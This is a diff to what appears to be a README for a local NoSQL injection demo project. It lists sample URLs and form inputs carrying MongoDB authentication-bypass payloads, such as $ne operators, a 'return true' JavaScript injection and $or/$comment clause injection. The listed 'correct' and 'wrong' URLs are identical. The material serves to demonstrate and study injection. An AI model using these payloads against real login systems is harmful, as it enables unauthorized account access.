@@ -9,4 +9,20 @@ username:sunxiuyang
 password:12
 
 then put this url on brower
-http://localhost/injection/login/login.php?username[$ne]=1&password[$ne]=1
+http://localhost/github/NoSQLInjectionAttackDemo/login/detected_login.php?username[$ne]=2&password[$ne]=r&login-submit=login
+
+
+
+correct url
+http://localhost/github/NoSQLInjectionAttackDemo/test_query1.php?username=1&password=1
+wrong url
+http://localhost/github/NoSQLInjectionAttackDemo/test_query1.php?username=1&password=1
+injection url
+http://localhost/injection/test_query1.php?username=1&password=2;return%20true;}//
+
+
+
+username：123',$or:[{},{'a':'a 
+password：'}],$comment:'successful MongoDB
+ username：1234 
+	password：1234','injection':'injection（自己发现的）
